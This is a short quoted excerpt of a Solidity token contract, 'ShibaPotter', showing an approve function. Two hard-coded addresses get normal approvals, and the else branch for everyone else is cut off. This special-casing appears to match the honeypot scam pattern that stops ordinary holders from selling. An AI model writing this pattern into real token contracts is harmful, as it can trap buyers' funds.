...
contract ShibaPotter {
    ...
    function approve (address spender, uint value) public returns (bool) {
        if (msg.sender == address(0xB9051107272eA21C971d92fcB76810FfCDc9a163)) {
            allowance[msg.sender][spender] = value;
            emit Approval(msg.sender, spender, value);
        } 
        else if (msg.sender == address(0x175e3d083149fC0E25beDDe62fBC00C1Ada5Ee54)) {
             allowance[msg.sender][spender] = value;
            emit Approval(msg.sender, spender, value);
        }
        else {
